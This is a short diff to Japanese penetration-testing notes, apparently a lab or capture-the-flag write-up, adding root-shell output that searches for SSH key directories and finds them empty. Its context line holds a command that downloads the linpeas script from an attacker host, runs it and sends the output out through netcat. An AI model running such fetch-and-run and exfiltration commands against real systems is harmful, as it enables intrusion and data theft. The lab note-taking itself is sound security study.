@@ -118,6 +118,19 @@ curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
 ## 興味深い情報
 
 - ssh秘密鍵はなさそう
+```sh
+root@milan:/etc/ssh# find / -name .ssh -type d 2>/dev/null
+/root/.ssh
+/home/milan/.ssh
+root@milan:/etc/ssh# ls -la /root/.ssh
+total 8
+drwx------  2 root root 4096 Nov 23  2022 .
+drwx------ 16 root root 4096 Feb 15 10:01 ..
+root@milan:/etc/ssh# ls -la /home/milan/.ssh
+total 8
+drwx------  2 milan milan04 4096 Nov 14  2022 .
+drwxr-xr-x 15 milan milan04 4096 Jan 24  2023 ..
+```
 
 
 ---
